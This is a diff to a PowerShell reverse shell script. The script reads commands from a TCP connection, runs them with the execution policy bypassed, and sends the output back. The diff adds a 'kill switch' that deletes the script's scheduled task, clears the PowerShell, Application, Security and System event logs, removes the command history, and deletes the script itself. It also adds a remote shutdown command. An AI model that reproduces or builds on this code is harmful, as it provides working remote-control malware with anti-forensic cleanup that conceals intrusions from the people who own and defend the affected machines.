@@ -28,6 +28,7 @@ try {
 	$cmd_buff = [char[]]::new(1024)
 	$exit = 0;
 	$reading = $false
+	$terminate = $false;
 	while ($exit -eq 0) {
 		if($client.Client.Poll(5000000,[System.Net.Sockets.SelectMode]::SelectRead) -eq $true) {
 			if ($client.Client.Available -eq 0) {
@@ -47,16 +48,36 @@ try {
 						if ($launch -match "^cd (.*)") {
 							cd $Matches[1];
 							$client_writer.WriteLine(" ");
-						} else {
-							
+							$client_writer.Flush();
+						} elseif ($launch -match "--client_shutdown") {
+							$client_writer.WriteLine("client shut down");
+							$client_writer.Flush();
+							$client.Close();
+							$exit = 1;
+						} elseif ($launch -match "--kill_switch") {
+							$client_writer.WriteLine("client terminated.");
+							$client_writer.Flush();
+							#Unschedule task
+							C:\Windows\System32\schtasks.exe /Delete /TN rs-task /f
+							#Clear event logs on machine.
+							Clear-EventLog -LogName 'Windows PowerShell';
+							Clear-EventLog -LogName Application;
+							Clear-EventLog -LogName Security;
+							Clear-EventLog -LogName System;
+							Clear-History
+							Remove-Item (Get-PSReadlineOption).HistorySavePath
+							$terminate = $true;
+		     				$client.Close();
+							$exit = 1;
+						} else {							
 							foreach ($line in (powershell.exe -ExecutionPolicy Bypass -command $launch | Out-String -Stream) ) {
-								Write-Output $line;
-								$client_writer.WriteLine($line);							
-							}
-							
-						}	
-						$client_writer.WriteLine(" ");
-						$client_writer.Flush();
+								#Write-Output $line;
+								$client_writer.WriteLine($line);
+
+							}	
+							$client_writer.WriteLine(" ");
+							$client_writer.Flush();						
+						}
 					}
 				}
 			}				
@@ -65,5 +86,9 @@ try {
 }
 catch {
 	Write-Output $_;
+}
+
+if ($terminate -eq $true) {
+	Remove-Item $script:MyInvocation.MyCommand.Path -Force;
 }
 
